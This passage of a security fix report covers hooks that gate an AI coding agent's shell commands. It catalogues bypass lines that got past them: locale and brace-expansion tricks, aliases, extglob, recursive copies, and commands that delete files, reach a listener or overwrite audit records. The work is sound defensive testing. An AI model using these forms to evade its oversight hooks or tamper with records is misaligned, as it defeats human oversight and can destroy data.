#### 3. Double-byte locales: `|`, `{` and `}` taken as a second byte; brace groups bash closes late (high)

The round 3 fix refused a backslash right after a character outside ASCII
only, on the reasoning that every other second byte only takes an operator
from bash. Taking `|` joins two commands into one (`find t1 -name
ぁ|ls -o -delete` is one find in a GBK locale, which deletes t1), and
taking `{` or `}` makes or moves a brace group. The verifier found that
bash closes a group only at a `}` after its first top-level comma, in
every locale: `sort {a},-o}x` is `sort a}x -ox` and `find t2
{a},-delete}` deletes, which `_BRACE_EXPANSION` (`\{[^{}\s]*(,|..)...\}`)
never matched. Found here: Python's `\s` holds spaces bash does not split
at, so `find . {a　,-delete}` (U+3000) passed too.

- Fix (`_SPECIAL_AFTER_NON_ASCII`): a character outside ASCII right before
  any ASCII character bash treats specially that a double-byte encoding can
  take as a second byte (0x30 to 0x7E: `;<>?@[\]^`{|}~`) gives the line the
  worst case, read in the line as written, quoted text included (a quoted
  `|` is harmless, but an escaped character outside ASCII, `\ぁ|`, is masked
  whole while its last byte may take the `|`). JOHAB, whose second bytes
  reach down to 0x31, is named beside GBK, GB18030, BIG5 and Shift JIS
  (glibc builds a JOHAB locale with a warning). A byte below 0x30 is no
  second byte in any of them, and a letter, digit, `_`, `:` or `=` taken
  changes nothing bash does. `_simple_commands`' docstring now says so.
- Fix (`_brace_expansion`): a word (split at a space or a tab only, as bash
  splits) with an unquoted `{`, then an unquoted `,` or `..`, then an
  unquoted `}` gives the worst case, whatever braces lie between: a
  superset of what bash expands, closed under the characters a double-byte
  locale takes. Linear: three searches a word (the old pattern backtracked;
  a 4096-byte line of `{,` or `,..` classifies in milliseconds).
- `git rev-parse @{u}` and `git stash show stash@{0}` still observe (no
  comma); `grep -E '日本|中国' f` now asks (the quoted `|` follows a
  character outside ASCII). The hook refuses all of these already.
- Tests: `TestDoubleByteSpecials` (the premise in a GBK locale built with
  `localedef`: find deletes there, nothing is deleted in C; 11 lines take
  the worst case); `TestBraceGroups` (the premise in C and C.UTF-8,
  `find t2 {a},-delete}` deletes, 9 lines take the worst case, the reading
  stays linear); 13 controls still observe; the adapter (three lines,
  F501, and F504 under a policy); the plugin hook refuses six of them
  (F501, as before).
- On 95638a8's `grounded_agency/`: 43 of the new tests fail (every line
  above and the adapter's); the premises, the controls, the hook tests and
  the JSON Lines store's id test pass.

#### Sibling of 3: brace groups bash closes late, in the plugin's records guard and the audit and send skills' hooks (found here)

The verifier's brace finding holds in every shell-side reading of braces:
each paired a `}` with the nearest `{` (the records guard's `brace_words`,
the skills' jq `brace_group`), so a group bash closes at a later `}` was
kept as written. Reproduced here on 95638a8: the records guard asked (the
ordinary approval) for `tee {a},.claude/check}point.ok`, which bash runs as
`tee a}point.ok .claude/checkpoint.ok`; the send skill's hook let `env
{-u},cu{r,r}l} -s 127.1:18777/x` through (bash runs `env -u} curl curl
-s ...`); the audit skill's hook let `echo x | tee -a
.cl{x},a}ude/aud{y},i}t/rec{z},o}rds.json{w},l}` through (the expansion's
last word is `.claude/audit/records.jsonl`).

- Fix (`hooks/pretooluse_require_checkpoint.sh`): `brace_group` finds a
  group as bash's `brace_gobbler` does (the first `{`, but a `{}` that
  opens the word, from which a `}` closes a group: the first `}` at the
  group's level after a `,` or a `..` no `}` follows, at that level; else
  the next `{`), and `brace_expand` expands as bash's `brace_expand` does
  (the text before kept, a group with a comma split at its own commas and
  each part expanded again, a sequence its elements, any other group as
  written, the text after expanded again). A literal reading that refused
  a group followed by a comma and a `}` was tried first and dropped: it
  refused `jq '{"a":{"b":1},"c":2}' a.txt > b.txt` (the filter is read
  again as a shell would). The marks are read 64 characters at a time (bash
  measures the whole string at each `${w:i:1}`), and every character and
  mark read is charged to a new budget, 65536 a call (`BRACE_SCAN_LEFT`;
  past it, F504 with the over-budget reason): `{` repeated 4000 times, the
  slowest shape found, is refused in 0.8 s.
- Fix (`skills/audit/SKILL.md`, `skills/send/SKILL.md`, one jq block, a
  test keeps the two equal): `brace_expand` the same way in jq, null (read
  as may-name, so refused) past 256 words, groups 32 deep, 512 braces and
  commas in a word, or 8 `{` tried for one group; a group bash leaves as
  it is now stays as written (it was `\u0007`), which matches no name
  either. 16 KB adversarial runs take at most 0.25 s.
- Checked against bash on 44 words (late groups, `{}` at a word's start,
  `..` before a `}`, nested, sequences with steps and padding, the
  reported forms): the guard's words are bash's for all; the jq block's
  are bash's but for `{a,,}`-style empty words, which name nothing.
- Tests: `tests/test_records_guard.py` `TestLateClosingBraceGroups` (the
  premise; 6 records paths refused; the reading equals bash's on 44
  words; 7 controls asked, the nested jq filters among them);
  `tests/test_skill_hooks.py` (`test_the_brace_reading_is_bashs` on 37
  words, the two copies equal, `TestLateBraceGroups`: 3 tool names the
  send hook refuses, nested JSON payloads it still lets through, the audit
  records path it refuses). On 95638a8's hooks and skills: 17 fail; the
  premises and the controls pass.

#### 4. A crafted checkpoint state file made persists raise RecursionError: the boundary skipped, a hold leaked, construction crashed (low)

`json.loads` on about 100 KB of nested `[` raises RecursionError, which is
no ValueError: `_read_state_file`'s callers caught neither it nor anything
past `(OSError, TypeError, ValueError, OverflowError)`. `_merged_state` read
the state file at every persist, a file git tracks included (the load
refuses one). So with a tracked deep file every persist raised after its
change was made in memory: `validate_and_reserve` recorded a hold and
raised before the hook set `held`, so the R407's `release()` did nothing;
the Stop's `resolve_holds_in_scope` raised, so `end_validity` never ran,
and once the file was gone (a branch switch) a turn-2 Write ran on a
checkpoint from before the Stop (the verifier showed the UserPromptSubmit
boundary ends it in the adapter's real setup, hence low). An untracked
`{"history": [[[...]]]}` made `GroundedAgentAdapter()` raise.

- Fix (`grounded_agency/state/checkpoint_tracker.py`): `_read_state_file`
  turns the parser's RecursionError into a ValueError (a file that does not
  parse: the load starts fresh, the merge replaces it); `_merged_state`
  reads the file only when git does not track it (`_tracked_by_git`) or it
  is still the file this tracker wrote last (device, inode, size, mtime
  and ctime, taken after the rename, under the lock: no git run at each
  persist); `_persist_state` never raises (logged; the change stands in
  memory, which is what the tracker decides on); the load and the archive
  reader catch RecursionError too.
- Fix (`grounded_agency/adapter.py`): the boundary hook resolves holds,
  ends validity, clears the per-call state and records, each whatever the
  step before it did; the PreToolUse hook's failure path releases whatever
  hold the call made (`release(any_hold=True)`), as the permission
  callback's already did.
- Siblings (the same parse, a RecursionError no handler caught):
  `JsonlEvidenceStore` skips and counts such a line (it did not open);
  `IdempotencyLog` cuts it off as a torn last line and raises `ValueError`
  for one anywhere else; the snapshot store's collection keeps every object
  while a manifest is one (discarding a checkpoint raised).
- Tests (`tests/test_checkpoint_state_depth.py`): the premise; an untracked
  deep file (both shapes) starts fresh and is replaced; the adapter starts;
  a tracked deep file cuts no transition short; the merge skips a tracked
  file's checkpoints and holds; a persist that raises RecursionError cuts
  nothing short; a deep archive line is skipped; the reported route
  end to end (turn 1 not R407, no valid checkpoint after the Stop, turn 2
  F501); a failed check releases its hold; the boundary ends validity when
  resolving fails; a control (two untracked trackers still merge). On
  95638a8: 10 fail, the premise and the control pass. The siblings'
  tests (`test_idempotency.py`, `test_evidence_store.py`,
  `test_snapshots.py`) fail on 95638a8.

#### Documentation

SECURITY.md §5.5 (the adapter's classifier: the double-byte characters,
braces, `{name}`, `>&`; the tracker's merge, parse and writes) and §5.1
(the records guard's brace reading and its new bound), `hooks/README.md`
(the same), the SDK guide (Bash Command Classification, Checkpoint
Lifecycle, Destination policies), `_simple_commands`' docstring, the
hooks' and skills' comments, CHANGELOG [Unreleased] Upgrading (the
classifier, the pointer, the tracker, the evidence and log readers, the
plugin's brace reading; 33 call fixtures). The Standard's text was not changed: §5.18.3, §5.18.8
and §4.4.2 already require the refusals these fixes bring the layer to.

#### Checks after batch 2

- Python: `pytest tests/` (6980 passed, 18 skipped: 6861 plus the new
  ones), after every change to the hooks and skills; before them, 6951.
  The hook suites again after the last hook change (skill hooks,
  pre-tool-use, records guard, hooks unit, project settings, the Bash
  classifier files, the tracker's depth file: 2161 passed). ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`
  (one call fixture added: `send_destination_pointer_index`);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: the package's check and test (2015; no package source
  changed, its build reused); the binding's check and test (248 passed, 2
  skipped: the new call fixture, which its `atPointer` already refused,
  and the fixture count 33).
- Site: `npm run check`, `npm test` (1173, with the new files staged: the
  fixture counts read tracked files), `npm run build`. The figure-gap
  sweep (`check-runs.mjs`, headless shell 1248) fails on
  `/guides/claude-agent-sdk/` before this batch already: at 95638a8's
  guide, runs of 2307 px (Unbound Tools and Bash Command Classification)
  and 1938 px (Evidence Stores, Secrets, Grounding Policies), grown since
  the last measurement (1798 px) by batches that did not run the sweep.
  This batch's text adds 113 px to the first (2420 px) and nothing to the
  second; shortening or splitting those runs is left to a task of its own,
  since it restructures the guide's prose.
- Old code: the new Python tests against 95638a8's `grounded_agency/`
  (classifier, adapter and the in-memory store's ids: 43 fail; tracker:
  10 fail; the evidence, idempotency and snapshot siblings: 3 fail; the
  call fixture: both plays fail); the hook and skill tests against 95638a8's `hooks/` and
  `skills/` (17 fail); the premises and the controls pass on both.
- Probes, each under `timeout 120` and a 4 GB address-space limit (Node
  and Chromium under a larger address-space or data limit, as before): the
  reported lines through the classifier and the adapter, `p12.py` and
  `p7.py` pointed at this worktree (turn 1 asks, no valid checkpoint after
  the Stop, turn 2 F501; the adapter constructs), bash's expansion of every
  brace case, the GBK premise with a locale built by `localedef`, the
  hooks' timings on 4 KB adversarial words. No CLI or nested agent was
  started; nothing was left running; the scratch copies were removed.

### Batch 3: five reported defects

Five defects, each reproduced by an independent verifier on 7d04aea and
reproduced again here on 0a801a8 before any change (the skills' Bash hooks
taken out of their frontmatter and run on Claude Code's JSON, under
`timeout 120` and a 4 GB address-space limit): the send skill's hook exited
0 on `! curl`, `if curl`, `prlimit curl`, `setpriv curl`, `! wget`, `! cp
/usr/bin/curl fx; ./fx`, `prlimit install`, `if ln -sf`, wget's `-O
--no-config`, `-U --no-config` and `-- --no-config`, `alias get=curl` then
`get`, `hash -p /usr/bin/curl x`, `BASH_ALIASES[g]=curl` and `shopt -s
extglob` then `/usr/bin/c@(u)rl`; the audit skill's hook exited 0 on the
extglob records path, `cp -r SRC/. .` and `git checkout FETCH_HEAD -- .`;
the rollback skill's hook exited 0 on `git st@(a)sh apply <unrecorded>`.
None was fixed by an earlier batch: round 3 batch 3 #3 set the `-q` and
`--no-config` rules behind the position test of round 2 #14 (copies),
round 2 #16 named each archive and patch tool, and round 2 #17 read the
rollback hook's words with no glob reading but `expands`. Neither the
plugin's pre-tool-use hook nor the SDK mapper holds these rules (both gate
every such command as `mutate`: `(` and `shopt` are refused by the hook's
reading, the mapper classes them `mutate`), so no Python or TypeScript
counterpart changed. Each fix has tests that fail on the code before it
(below).

#### 1. The send hook's configuration and copy rules were skipped after a reserved word or a wrapper missing from its list (medium); siblings: the tool as a redirection's source, the tool given to any other program, the audit hook's writers

`check_request` applied the `curl -q`/`wget --no-config` rule only when
`$at == 0` or a word before the tool was on `shells`, and the copy rule
used the same test, so `!`, `if`, `while`, `until`, `coproc` and every
wrapper missing from the list (`prlimit`, `setpriv`, `runcon`, `unbuffer`,
`faketime`, a loader) put the tool where the hook read it as not running.

- Fix (`skills/send/SKILL.md`, `check_command`): the command's program is
  its first word that is not a reserved word. The tool runs when it is the
  program, or after a program on `wrappers` (those that run the program a
  later word names: `env`, `sudo`, `timeout`, `nice`, `exec`, `eval`, ...)
  with only options and numbers between (`timeout 5`, `nice -n 10`); a tool
  word given to any other program is refused (kind `argument`: the program
  may run it unread or copy it), after its words are read as a request with
  the configuration rule; only `which`, `whereis`, `type`, `echo` and
  `printf`, which run nothing, and a package manager given the tool's bare
  name (`apt-get install -y curl`), are exempt. The copy rule refuses a
  copier anywhere from the program on, in a command where a word (a
  redirection's target included) names the tool, unless the program is the
  tool itself (whose words are URLs and file names: `curl -q
  https://example.com/install`) or exempt. A variable set after a reserved
  word (`! X=1 curl`) is read as one set on the line.
- Siblings found here: `cat < /usr/bin/curl > fx` and `tee fx <
  /usr/bin/curl` copied the tool unread (the rule read only arguments);
  `head -c ... /usr/bin/curl > fx`, `gzip -c`, `awk 1 curl` from the tool's
  directory copy it through a program that is no copier (now `argument`).
  The audit hook's `writer_refusal` had the same position test: `! tar
  -xf`, `if git apply`, `setpriv patch`, `runcon tar` passed; it now skips
  reserved words and reads every later word of any program it does not read
  with a rule of its own (`known`: the readers, the writers, the programs
  with a rule but `xargs`), so an unlisted wrapper runs nothing unread. A
  here-document's body, which the hook reads as commands, would then refuse
  prose (`git commit -m "$(cat <<'EOF' ... Don't apply the patch ...)"`):
  `heredoc_data` marks, in one linear pass, the body of a here-document
  whose command's program is a reader and that no pipe follows, and such a
  body is read with the old rule (its first word, and any word after a
  listed wrapper); `cat <<'EOF' | sh` and `sh <<'EOF'` are read in full. A
  data body's end is found at a line holding only its delimiter; a command
  whose data body holds a line continuation (which this reading joins where
  bash, with a quoted delimiter, does not) or ends at a delimiter other than
  a plain word is refused (`expands a here-document`), so the lines after a
  body are never read as data.
- Tests (`tests/test_skill_hooks.py`): `TestSendReadsWhereTheToolRuns`
  (11 configuration lines, 7 copies, 8 arguments; 16 controls still run:
  `timeout 5 curl -q`, `sudo`, `env -i`, `nice -n 10`, `time`, `! curl -q`,
  `which curl wget`, `apt-get install -y curl wget`, `curl -q
  https://example.com/install`, ...), `TestAuditReadsEveryWriter` (the
  reserved-word and wrapper lines, `cat <<'EOF' | sh` and `sh <<'EOF'`
  bodies; the commit-message and `cat <<'EOF' > notes.md` controls), the
  premise `test_curl_after_a_reserved_word_reads_its_configuration`
  (Claude Code's wrapper, an unknown option in `~/.curlrc`).

#### 2. wget's `--no-config` was accepted from any word (medium); sibling: `--` in every tool's reading, the audit hook's wget rule

`any($words[]; .d == "--no-config")` took the value of `-O`, `-U`,
`--header` or `--user-agent`, and a word after `--`, though wget then reads
`~/.wgetrc` (verified offline: an unknown command there is reported with
`-O --no-config` and `-O - -- --no-config`, not with the option).

- Fix (`check_request`): the reduce records `--no-config` only where it
  reads an option (not a value it skips, not after `--`); a word after `--`
  is an operand for every tool, so `curl -q -- -H 127.1:18777/x` is read
  as a URL (it skipped `127.1:18777` as `-H`'s value).
- Sibling: the audit hook's `wget_refusal` took `--no-config` anywhere
  too; it now requires it as wget's first word (strict; the documented form
  is `wget --no-config ...`).
- Tests: the six decoys in `TestSendReadsWhereTheToolRuns`, `curl -q --
  -H 127.1:18777/x`, `wget -O --no-config` in `TestAuditReadsEveryWriter`,
  the premise `test_wget_skips_its_configuration_only_for_the_option`;
  `wget -O - --no-config https://example.com/` still runs.

#### 3. `alias` and `hash -p` gave curl another name in the same command (medium); siblings: `BASH_ALIASES`, `BASH_CMDS`, `enable`, a path or a value in a command line in a word

Claude Code's shell expands aliases, and `eval` parses each line after
the one before ran: `alias get=curl` then `get -q 0x7f.1:18777/` reached
the listener; `hash -p /usr/bin/curl x` too. `embedded` needed the name
after a blank or an operator, so neither `get=curl` nor `sh -c
'/usr/bin/curl ...'` was read as a command line (the second a sibling of
round 2 #13).

- Fix: in a command that names a tool, a word `alias`, `hash`, `enable` or
  `function` is refused (kind `alias`), unless the program runs nothing
  (`echo hash`); `BASH_ALIASES` and `BASH_CMDS` join `setting_vars` (so
  `BASH_ALIASES[g]=curl`, `read 'BASH_ALIASES[g]'` and `declare` are read
  as a setting); `embedded` takes the name after `=` or `/` and before `;`,
  `&`, `|`, `)` or a quote (`eval 'alias g=curl'`, `sh -c 'alias g=curl;
  g ...'`, `sh -c '/usr/bin/curl ...'`, `bash -c 'hash -p ...'`).
- Tests: 14 lines in `test_another_name_for_a_tool_is_refused` (one,
  `BASH_CMDS[x]=/usr/bin/curl`, held before as a glob: it is kept as a
  control); the premise `test_a_name_runs_another_program` (alias, `hash
  -p`, `BASH_ALIASES` through Claude Code's wrapper).

#### 4. The shared word reader and the three gates did not read extglob patterns (medium); siblings: nocaseglob, dotglob, the rollback gate's plain globs

`hooks/shell_words.jq` split `c@(u)rl` at `(`, and the gates reacted only
to `*`, `?`, `[` and `{`; once a command has run `shopt -s extglob` (or a
file it sources does), bash reads the group as part of a word, blanks and
`;` included, and expands it as a pattern (verified: `@(a b)` is one word).

- Fix (`hooks/shell_words.jq`, copied into the three skills): an unquoted
  `[@!+*?](` (a line continuation allowed before the parenthesis) is a
  token of its own, `ext`, and `commands` gives `why: "extglob"`. The send
  hook refuses any command holding one (kind `program`, whatever it names);
  the audit hook reads such a command in full, in the command and in its
  unquoted re-reading, and refuses it (`expands an extglob pattern`); the
  rollback hook reports it unread (F503). Each gate's first reading now
  passes `@(`, `!(` and `+(` on (`*(` and `?(` hold `*` and `?`).
- Siblings found here: `shopt -s nocaseglob` then `/usr/bin/CU?L` passed
  the send hook (its tool-name match was case-sensitive): the pattern is
  now matched in lower case. `shopt -s dotglob` then `cp t
  *l?ude/au?it/rec?rds.js?nl` passed the audit hook, and `tee ~/*c?rlrc`
  the send hook's setting-file rule (a glob matched a leading dot only by a
  dot): where the command may turn on dotglob (it names `shopt`,
  `GLOBIGNORE`, `BASHOPTS`, `SHELLOPTS` or `dotglob`, or sources a file or
  evaluates text; `$dots`, passed from the shell), a glob matches a leading
  dot too. The rollback gate read only a command naming `stash`, so `git
  st?sh apply <unrecorded>` (a file named `stash` made by an earlier call)
  restored unread: it now reads a command holding a glob, a brace or an
  extglob opener, and a glob word counts as `stash`, `pop`, `apply` or
  `branch` where its pattern (lower case, a class as any run) matches the
  name; `git add *` is refused, `git add *.py` is not. Claude Code's
  snapshot of the user's own shell options and aliases is the user's
  configuration, like `.curlrc` was before -q: noted in SECURITY.md's
  limitations.
- Tests: extglob, nocaseglob and dotglob lines in
  `test_another_name_for_a_tool_is_refused` and
  `TestAuditReadsEveryWriter::test_blocks_a_pattern_or_text_it_cannot_read`,
  `TestRollbackReadsGlobs` (4 globs and the extglob line refused; 4
  controls run), the premises `test_a_name_runs_another_program` (extglob,
  nocaseglob) and `test_dotglob_matches_a_leading_dot`, and end to end
  `test_a_copy_or_a_commit_written_is_refused_before_it_runs` (extglob and
  dotglob: refused, and run through Claude Code's wrapper each writes the
  token into the records file) and
  `test_the_rollback_hook_refuses_a_globbed_restore_before_it_runs`
  (refused, and run each restores the unrecorded commit).

#### 5. The audit hook's writer list missed recursive copies and the git commands that write the work tree from a commit (medium)

`cp -r SRC/. .`, `git checkout FETCH_HEAD -- .`, `git restore
--source=FETCH_HEAD .`, `git reset --hard`, `git pull`, `git merge`, `git
switch` and `git cherry-pick` each passed and wrote the token into the
records file: the early gate did not name `cp` or `scp`, and `git_refusal`
refused only the plumbing of round 2 #16 and commands outside `git_own`.

- Fix (`skills/audit/SKILL.md`): `cp` and `gcp` with a recursive option
  (`-r`, `-R`, `-a`, `--recursive`, `--archive`, abbreviated) are refused
  (`cp_refusal`), and `scp`, `rclone`, `sftp`, `lftp` and `unison` join
  the writers (the gate names them all); git keeps its alias and
  own-command rules, then allows only `git_reads` (reads, and commands that
  write no file of the work tree from a commit: `add`, `commit`, `fetch`,
  `push`, `branch`, `tag`, `rm`, `mv`, `config`, ...; `grep` but with
  `-O`, which runs the program it names), `stash` only `list`, `show`,
  `create`, `store`, `drop` and `clear`, `reset` only with `--soft`,
  `--mixed`, `-q` (any other option, `--ha` among them, is refused), and
  `checkout` and `restore` only with no option of git's before them and
  only of literal paths after `--` (no glob, no `:` magic, no `..`, `~` or
  expansion, no `--pathspec-from-file`) that neither are nor hold
  `<project>/.claude/audit/records.jsonl`, resolved from the call's
  directory: the rollback skill's own restore (`git restore --source=<sha>
  --worktree -- <paths>`) still runs. Every other git command (`switch`,
  `merge`, `pull`, `rebase`, `cherry-pick`, `revert`, `stash apply`,
  `worktree`, `submodule`, `sparse-checkout`, `clone`, `bisect`, `checkout
  <branch>`) is refused once the audit skill ran.
- Tests: 32 lines in `test_blocks_a_program_that_writes_from_its_input`
  (each reported line and its siblings), 18 controls (`git status`, `git
  log --grep tar`, `git reset HEAD~1`, `git stash create`, the rollback
  skill's restore, `git checkout main -- src`, `cp a b`, ...), and end to
  end `test_a_copy_or_a_commit_written_is_refused_before_it_runs` (`cp -r`,
  `! cp -r`, `git checkout FETCH_HEAD -- .`, `git reset --hard`: refused,
  and each, run, writes the token; no path in them names records, jsonl,
  audit or `.claude`).

#### Documentation

SECURITY.md §5.4: the send row (where a tool runs, the `argument`
refusal, wget's option, `--`, `alias`/`hash`/`enable`/`BASH_ALIASES`/
`BASH_CMDS`, a tool's path or value in a word, nocaseglob, dotglob,
extglob, and the user's own shell configuration among what is not read),
the audit row (dotglob, extglob, recursive copies, the git allowlist and
its `checkout`/`restore` rule, wget's first word, reserved words and
unlisted wrappers, data bodies), the rollback row (globs, extglob).
`hooks/README.md` (the shared reader's `ext` token), the hooks' comments
and refusal texts, CHANGELOG [Unreleased] Upgrading (what each skill hook
now refuses once its skill ran). The Standard's text was not changed:
these are host-specific additions (§5.18.10) whose documented promise in
SECURITY.md the code now keeps.

#### Checks after batch 3

- Python: `pytest tests/` in bounded parts (each file under `timeout 120`;
  `tests/test_skill_hooks.py` in six `-k` groups that together select all
  of its 1752 tests): 7281 passed, 18 skipped (6980 before, plus the 301
  new). ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the five generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: no package or binding source changed; the package's test
  (2015, its build reused) and the binding's check and test (248 passed, 2
  skipped).
- Old code: the new tests against 0a801a8's `skills/` and `hooks/` (an
  archive of HEAD with the new test file): 201 fail; all that pass are the
  controls, the premises and the `BASH_CMDS` line noted above.
- Probes, each under `timeout 120` and a 4 GB address-space limit: every
  reported line through the three hooks before and after; the hooks on 16
  KB adversarial commands (4000 here-documents on one line and 2000 on as
  many lines, a data body of 2600 lines, 5300 `--` after a URL, 3200 tool
  words after `prlimit`, 4000 `tar` words after `setpriv`, 5300 extglob
  openers, a 900-line commit message in a here-document): each decided in
  at most 2.1 s. No CLI or nested agent
  was started; nothing was left running; the scratch copies were removed.

### Batch 4: four reported defects

Four defects, each reproduced by an independent verifier on 7d04aea, and
reproduced again here on 89b67d3 before any change, with the new tests run
against 89b67d3's `skills/`, `hooks/` and `src/acs/grounded.ts` (under
`timeout 120` and a 4 GB address-space limit): the audit skill's hook
exited 0 on each reported record and on 6 of the 10 data vectors of
`tests/conformance/secrets/credentials.json` that hold a credential; the
send skill's hook exited 0 on each reported wrapper line; the binding's
nested grounded `classify` under a composite given the profiles was
recorded `executed` at confidence 0.12 with no anchor; and the runtime's
plain tool under the unregistered name `notify` sent to the attacker's
host with no trace entry. None was fixed by an earlier batch: round 2 #24
put `SECRET_MEMBER_JQ` in the plugin's pre-tool-use hook only, round 4
batch 3 #1 chose the tool by the first word naming one, round 2 batch 5
gave the composite's output rules to nested plain calls only, and round
2 #21 counted only the layer's and the composite's policies. Each fix has
tests that fail on the code before it (below).

#### 1. The audit skill's hook let a record hold a value under a member named for a credential (medium)

The append form's record was scanned only with `secret_in` over the
command and the record's decoded text, whose rules need a quoted value of
8 or more characters with no blank, or an unquoted one of 12 or more
mixing letters and digits; `{"password":"hunter2"}`, a value in an array,
one with blanks, a number (`{"token":4111111111111111}`), the value of a
`{"name":"Authorization","value":...}` pair and the second of a
`["Cookie",...]` tuple passed, though the plugin's pre-tool-use hook
refuses the same data from a persist tool, the SDK's
`Redactor.holds_credential` and the binding's `holdsCredential` refuse it,
and §5.18.10's `audit` row (F504) and §6.7 forbid it.

- Fix: the member rule moves to a shared file, `hooks/secret_member.jq`
  (the jq port of `_secret_member_value`, between `# BEGIN secret-member`
  and `# END secret-member`, with no single quote, since each copy sits in
  a single-quoted shell string), copied verbatim into
  `hooks/pretooluse_require_checkpoint.sh` (which held its own copy) and
  into the audit skill's Bash hook, as `secret_scan.sh` is. The audit hook
  runs `acs_held(false)` on the parsed record of the append form: `true`
  is refused with the scan's F504 message, anything but `false` (jq could
  not read it) with R407.
- Tests (`tests/test_skill_hooks.py`):
  `test_secret_member_copies_are_equal` (both copies equal to the file,
  inside `SECRET_MEMBER_JQ='...'`, the file free of `'`);
  `TestAuditCommandHook::test_blocks_a_value_under_a_credential_member`
  (the 4 reported records, the verifier's 2, a cookie tuple and a nested
  `client_secret`, in both append forms, under sh and bash);
  `test_agrees_with_the_refusal_rule_on_data` (the 14 data vectors of the
  shared credential vectors: refused exactly where `holds` says so); 6
  controls (`token_count` a number, `password: true`, a placeholder
  `<ref>`, a 3-character token, an `Accept` pair, no credential member).
  On 89b67d3: the copy test, all 32 member lines and 12 of the 28 vector
  runs (6 vectors, each shell) fail; the controls and the vectors both
  layers decide alike pass.
- Sibling found here (both hooks): the member rule tested each member's
  name, and each value under a secret member, with a regular expression,
  which jq compiles at each test (about 0.4 ms): the pre-tool-use hook took
  22.4 s of its 30 on a TodoWrite holding 50,000 members (1.2 MB), and
  14 s on 150,000 placeholders under one; the audit hook 22 s on a 1.1 MB
  record. The shared rule now compares in ASCII lower case with string
  functions (`ascii_downcase`, `endswith` over the 24 spellings the SDK's
  pattern admits, `IN`; a placeholder by its first character and no line
  break), the SDK's own folding (`re.ASCII`, IGNORECASE); a name outside
  ASCII (`utf8bytelength` differs from `length`) is still tested with the
  regular expression's Unicode folding, so the hooks find a name the SDK
  does not in rare spellings (`ſecret`), never the reverse, and a
  placeholder is matched in ASCII only, so no rare spelling hides a value.
  The same inputs take 1.9 s, 0.9 s and 2.0 s. Tests: `test_many_members_are_decided_in_time`
  (`tests/test_pretooluse_hooks.py`: 40,000 members refused and 120,000
  placeholders allowed, each in under 5 s; both fail on 89b67d3's hook,
  which took about 18 s and 11 s) and
  `test_a_record_of_many_members_is_decided_in_time` (the audit hook, 1 MB,
  under 5 s); the agreement tests with the adapter and the shared vectors
  still pass.
- Siblings checked: the persist skill's hook scans a file's text, which the
  SDK and the binding read with the text rule too (no member rule applies
  to a string), so it is not one; the binding's audit tool and nested
  plain audit calls, and the SDK adapter, already apply the member rule.

#### 2. The send skill's hook read curl's words with HTTPie's (or wget's) grammar after a wrapper's option whose value names a tool (medium); siblings: the redirect and configuration rules, the copy and argument rules, xargs

`check_command` took `$at`, the request's program, as the first word naming
a tool, so in `env -C http curl ...`, `env -u http curl ...` and `sudo -u
http curl ...` (where curl runs) it read curl's words with HTTPie's table:
`-s` and `-a` took the next word as their value and `x?a=b` from the third
positional was a data item, so `0x7f.1:18777` reached the listener; the
`curl -q` rule (`env -u http curl -s https://...`), the redirect rule
(`--expand-connect-to`, read as a header item) and wget's table (`env -u
wget curl -q -H --no-config -I ...`) were skipped the same way.

- Fix (`skills/send/SKILL.md`, `check_command`): where the program is a
  wrapper, the words that may stand between it and the tool it runs are
  options, numbers, wrappers and words naming a tool (one may be an
  option's value), up to the first other word; the tool runs when every
  word naming one stands there, and then every such word is read as a
  request with its own tool's grammar (`$reads`), the command refused when
  any reading refuses. Reading every word costs the command's length
  times their number, so more than 8 such words after a wrapper are
  refused (kind `many`); an inert program (`echo`, `which`, a package
  manager) and a program that runs none are read at their first word
  naming a tool, as before, so each word is read at most 8 times. `xargs`
  and `parallel` count before the last word naming a tool, not the first.
- Siblings found here: `env -u http gzip -c curl > fx`, `env -u http
  prlimit curl ...` and `env -u http xargs curl` passed for the same
  reason (the copy-through and argument rules took `http` as the tool that
  runs); each is refused now (argument, feeds). The audit skill's hook
  reads every word after a program it does not know (`env` included) as a
  program, so it reads both words already; the rollback hook reads no
  tool's grammar; the plugin's pre-tool-use hook and the SDK mapper gate
  every such command as a mutate.
- Tests: `TestSendReadsWhereTheToolRuns::
  test_a_wrapper_option_naming_a_tool_is_read_both_ways` (16 lines: each
  reported line, the verifier's siblings, `sudo -u wget -g http curl`,
  `sudo -u http wget -qO- ...`, and the three siblings above),
  `test_more_than_eight_tool_words_after_a_wrapper_are_refused` (9
  refused, 8 run), `test_many_tool_words_are_decided_in_time` (16 KB:
  3200 `curl` after `echo`, 2000 `curl -q` and 3200 `http` after `env`,
  1600 `http -s` after `prlimit`, each under 10 s; 1.2 to 1.7 s measured,
  where reading every word took past 30 s for the first), 5 controls in
  `test_still_allows_these_requests` (`sudo -u http curl -q https://...`,
  `env -u http`, `env -C http`, 8 `curl -q` after `env`, `curl -q -o
  out/curl ...`), and the premise
  `test_a_wrapper_option_takes_a_tool_name_as_its_value` (`env -C http` and
  `env -u http` run curl, which reads `-s` as its flag and fetches a
  `file://` page). On 89b67d3, 28 of the 32 runs of the new refusals fail
  (the two lines that pass were refused for another reason: `sudo -u wget
  -g http curl`, read in wget's grammar, and `head -c 5`, whose `5` reads
  as host 0.0.0.5) and the bound test fails; the controls, the timing and
  the premise pass.

#### 3. The binding applied a composite's profile output rules to a nested plain call only, not to a nested grounded one (medium); sibling: a nested call two composites deep

`NestingToken` carried the composite's destination policies, not its
output rules; a nested grounded call was checked against its own
`policies` and `minimumConfidence` only, so an ungrounded `classify` below
the healthcare profile's 0.9, invoked by a composite given that profile,
was recorded `executed`, counted in `acs:executed` and returned as a
success (§5.21.3: a layer applying a profile applies its rules to the
outputs of the calls it covers).

- Fix (`examples/standard_agents/src/acs/grounded.ts`): the token carries
  the composite's grounding policies (its own option and its profiles')
  and highest minimum confidence, with those of the composites enclosing
  it; `check` returns them in the claim; `execute` checks the output
  against the tool's own policies, then the enclosing ones that require
  its capability (F505), then the higher of the two minimums (F504), in
